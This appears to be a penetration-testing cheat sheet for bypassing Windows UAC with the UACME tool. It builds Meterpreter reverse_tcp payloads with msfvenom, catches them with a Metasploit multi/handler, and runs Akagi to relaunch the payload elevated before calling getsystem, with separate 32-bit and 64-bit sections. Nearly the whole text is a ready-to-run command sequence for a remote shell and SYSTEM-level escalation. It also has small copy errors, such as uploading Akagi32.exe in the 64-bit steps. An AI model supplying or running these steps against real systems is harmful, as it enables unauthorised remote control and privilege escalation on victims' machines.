# Clone and Compile
```bash
git clone https://github.com/hfiref0x/UACME.git
# Compile with Visual Studio
```

# Create Payload and Deploy 32-bit
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attack Host> LPORT=<Port #> -f exe -o exploit.exe

# Upload files with Meterpreter
meterpreter > upload exploit.exe .
meterpreter > upload UACME/Compiled/Akagi32.exe .

background
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <Attack Host>
set LPORT <Port #>
run

sessions -i <Session #>

shell
Akagi32.exe <Method #> <Current Path>\exploit.exe
Akagi32.exe 10 C:\Users\Username\Downloads\exploit.exe

# New meterpreter shell created.
getsystem
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attack Host> LPORT=<Port #> -f exe -o exploit.exe
```

# Create Payload and Deploy 64-bit
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attack Host> LPORT=<Port #> -f exe -o exploit.exe

# Upload files with Meterpreter
meterpreter > upload exploit.exe .
meterpreter > upload UACME/Compiled/Akagi32.exe .

background
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <Attack Host>
set LPORT <Port #>
run

sessions -i <Session #>

shell
Akagi64.exe <Method #> <Current Path>\exploit.exe
Akagi64.exe 10 C:\Users\Username\Downloads\exploit.exe

# New meterpreter shell created.
getsystem
```

# References
##### [GitHub](https://github.com/hfiref0x/UACME)